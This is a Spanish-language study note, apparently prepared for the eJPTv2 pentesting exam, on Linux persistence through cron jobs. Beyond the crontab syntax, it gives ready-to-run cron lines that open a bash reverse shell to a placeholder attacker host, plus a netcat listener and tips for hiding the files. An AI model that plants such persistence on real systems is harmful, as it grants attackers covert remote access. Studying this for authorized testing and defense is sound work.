# ⏰ Persistencia en Linux: Cron Jobs
La persistencia mediante **Cron** aprovecha el demonio `crond`, encargado de ejecutar tareas programadas en segundo plano. Al insertar una línea maliciosa en el tablón de anuncios de tareas (`crontab`), obligamos al sistema a conectarse de vuelta a nuestra máquina atacante de forma periódica.

## 🧐 1. ¿Cómo funciona el sistema Cron?
El archivo `crontab` utiliza una sintaxis de 5 asteriscos `(* * * * *)` para definir el tiempo de ejecución:
`*(Minuto) *(Hora) *(Día del Mes) *(Mes) *(Día de la Semana) <Comando>`

| Posicion        | **Campo**      | **Rango** | **Descripción**                |
| --------------- | -------------- | --------- | ------------------------------ |
| **Primer** `*`  | **Minuto**     | 0 - 59    | El minuto exacto de la hora.   |
| **Segundo** `*` | **Hora**       | 0 - 23    | La hora del día (formato 24h). |
| **Tercer** `*`  | **Día mes**    | 1 - 31    | El día del mes.                |
| **Cuarto** `*`  | **Mes**        | 1 - 12    | El mes del año.                |
| **Quinto** `*`  | **Día semana** | 0 - 6     | 0 es domingo, 6 es sábado.     |
**Ejemplo:** `* * * * *` significa que el comando se ejecutará **cada minuto de cada hora de cada día de cada mes y todos los días de la semana**

![[Imagenes/AnatomiaCronJob.png]]

## 🚀 2. Métodos para crear Persistencia
Existen dos formas principales de añadir una tarea cron: editando el archivo del usuario o los archivos del sistema.
### Método A: Usando el archivo temporal (Manual)
Este método es útil si tienes una shell básica. Creamos un archivo con nuestra tarea y lo cargamos en el crontab.

1. **Crear el archivo de tarea:**
	- `echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<IP_KALI>/<PUERTO> 0>&1'" > /tmp/persist`
2. Cargar la tarea en el sistema:
	- `crontab -i /tmp/persist`
3. Verificar:
	- `crontab -l`
### Método B: Edición Directa
Puedes editar el crontab directamente:
- `crontab -e`
- (Añade la línea de la reverse shell al final del archivo y guarda).
## 🔓 3. Cómo recibir la conexión
Una vez configurada la tarea (por ejemplo, cada minuto), solo necesitas poner tu Kali a la escucha con **Netcat**:
- `nc -lnvp <PUERTO>`
- En un máximo de 60 segundos, recibirás la shell automáticamente.

## 🚩 4. Ubicaciones Críticas (Si eres ROOT)
Si has escalado privilegios a **root**, puedes ocultar tu persistencia en lugares donde un usuario normal no miraría:

- **/etc/crontab**: El archivo de configuración global del sistema.
- **/etc/cron.d/**: Directorio donde las aplicaciones instalan sus propias tareas.
- **/var/spool/cron/crontabs/**: Directorio donde se guardan los archivos de crontab de cada usuario.

Ejemplo en `/etc/crontab` (Requiere indicar el usuario):
- `* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/<IP_KALI>/<Puerto> 0>&1'`

## 💡 Tips para el eJPTv2

1. **Sigilo:** No uses nombres de archivos sospechosos como "persist" o "hack". Usa nombres como `.sys_backup` o `.cache_update` y escóndelos en `/tmp` o `/var/tmp`.
2. **Rutas Absolutas:** Siempre usa rutas completas (p. ej., `/bin/bash` en lugar de `bash`) porque el entorno de ejecución de Cron es muy limitado y puede no encontrar los binarios.
3. **Permisos:** Asegúrate de que el script que ejecutas (si usas uno externo) tenga permisos de ejecución (`chmod +x`).

#
---
**Navegación**:
- Volver a: [[Persistencia en Linux]]